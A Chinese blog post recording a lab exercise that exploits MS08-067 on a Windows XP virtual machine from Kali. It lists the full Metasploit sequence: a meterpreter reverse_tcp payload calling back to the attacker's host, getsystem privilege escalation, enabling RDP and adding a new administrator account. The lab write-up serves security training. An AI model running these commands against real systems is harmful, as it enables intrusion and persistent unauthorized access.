---
layout:     post
title:      "渗透测试综合实训1"
subtitle:   "终于要学到点真东西了吗"
date:       2025-09-06 12:00:00
author:     "hangyangjun"
header-img: "img/training.png"
tags:
    - 笔记
    - 记录
    - 学习
    - 实训
    - 安全
    - 渗透测试
    - WinXP
    - Kali
    - Linux
---
## 目标
 今日目标是使用 Kali 对 WinXP 系统的 **SMB服务 MS08-067漏洞**进行利用，最终进入系统桌面进行截图

>虽然什么也没讲，让直接进行实操，但是我还是很有自信的

## 并非一帆风顺的探索阶段
参考资料，使用`Metasploit`工具进行漏洞利用  
过程可以概括为：  
- 困难一：Kali系统镜像下载巨慢，不过教室的机器上有，而且密码相同  
- 困难二：教室的机器太慢了，无法使用。还好带了自己的电脑，有纯净的Kali，再下载软件就是了  
- 困难三：下载失败，原因找了一会，竟然是：签名验证失败，通过网上的教程：[更新时显示签名无效和没有数字签名](https://blog.csdn.net/mighty_Jon/article/details/136188482)修好了。  
- 困难四：由于教室插座不足，电脑没电了，只能使用教室机了（此时已经加载好）
- 困难五；无法找到目标机的IP，我猜目标机通过DHCP获取地址，且开放445端口，所以尝试找教室机的IP
- 困难六：对教室机网段全部IP进行测试均无结果，考虑到可能是虚拟机网络连接模式的问题
- 困难七：测试全部三种模式均不行，转用我的电脑进行测试（充上电了）
- 困难八：虽然是冲上电了，但是用dp口冲的，所以还是很卡
- 困难九：依然无法连接，使用两种端口扫描测试，结果均无开放端口，此时有点陷入自我怀疑，445怎么会没开放呢？
- 困难十：多次重启，发现目标机的VMware控制台视图没有IP地址，关闭目标机后，扫描结果甚至没变化，可能这网始终就**没连上**？

## 解决问题就在灵光一现之间

再次仔细研究资料，发现资料中命令的IP地址很可疑，难道说目标机的**IP地址是固定的**？~~那我之前扫描到的是谁呢？~~  

更改虚拟机的**虚拟网络编辑器**（*此处不再赘述*）  
设置好网段，经过两次测试，最终确定目标机的IP地址就是 `192.168.118.201`  

此时，困扰我一天的问题终于解决了，又是这样简单的问题。  
终于可以进行**下一步**了

## 过程及命令
### 扫描
仅发现主机，不扫描端口（快速）  
`nmap -sn 192.168.118.0/24`

快速扫描并显示操作系统信息（需要root权限）  
`sudo nmap -O -F 192.168.118.0/24`

探测 SMB 服务版本，判断是否存在已知漏洞：  
`nmap -p 139,445 -sV --script smb-vuln* 192.168.118.201`

## 安装及攻击

安装（[参考](https://zhuanlan.zhihu.com/p/604440914)）：  
`apt install metasploit-framework `

启动  
`msfconsole`

搜索相关模块  
`search ms08-067`

设置ms08_067_netapi攻击模块  
`use exploit/windows/smb/ms08_067_netapi`

设置反向代理  
`set payload windows/meterpreter/reverse_tcp`

查看选项  
`options`

设置要攻击的IP  
`set RHOSTS 192.168.118.201`

设置接收端IP（本机）  
`set LHOST  192.168.118.100`

设置接收端通信端口  
`set LPORT  4444 `

查看可以攻击的靶机操作系统型号  
`show targets`

选择windows xp sp3 简体中文  
`set targets 34`

实施**攻击**，得到shell  
`exploit`

## 提权和连接

查看当前权限：  
在meterpreter >提示符下输入：  
`getuid`
普通用户是：BUILTIN\Users  
如果已取得 `NT AUTHORITY\SYSTEM` 权限，则跳过提权

使用 Metasploit 的提权模块  
```bash
# 加载提权模块
background  # 将当前会话后台挂起（返回msfconsole）
use post/windows/escalate/getsystem
set SESSION 1  # 替换为你的会话ID（这里是1）
run

# 若成功，会显示[+] Got SYSTEM via ...，此时重新进入会话：
sessions 1  # 回到meterpreter会话
getuid      # 确认已获得NT AUTHORITY\SYSTEM权限

```
### 开启目标主机的 RDP 服务
自动开启RDP服务并添加防火墙规则  
`run post/windows/manage/enable_rdp`

手动验证 RDP 端口  
`nmap -p 3389 192.168.118.201`

如果目标主机没有可用的登录用户，可创建  
进入目标系统的CMD shell  
`shell`

在 CMD shell 中输入：
```cmd
chcp 65001     # 如果中文乱码
net user haoyangjun 123 /add  # 创建用户haoyangjun，密码123
net localgroup administrators haoyangjun /add  # 将用户添加到管理员组
```

如果shell总是断开或者添加失败  
直接在 Meterpreter 中执行命令（无需进入 shell）  
- 创建用户：`execute -f "net.exe" -a "user haoyangjun 123 /add" -i -t`
- 添加到管理组：`execute -f "net.exe" -a "localgroup administrators haoyangjun /add" -i -t`
- 验证存在：`execute -f "net.exe" -a "user haoyangjun" -i -t`

输入`exit`并按回车，回到 meterpreter >提示符

使用 RDP 客户端连接目标主机  
`rdesktop 192.168.118.201`

熟悉的xp界面，输入账号密码即可**进入桌面**  
然后就是想做啥就做啥喽。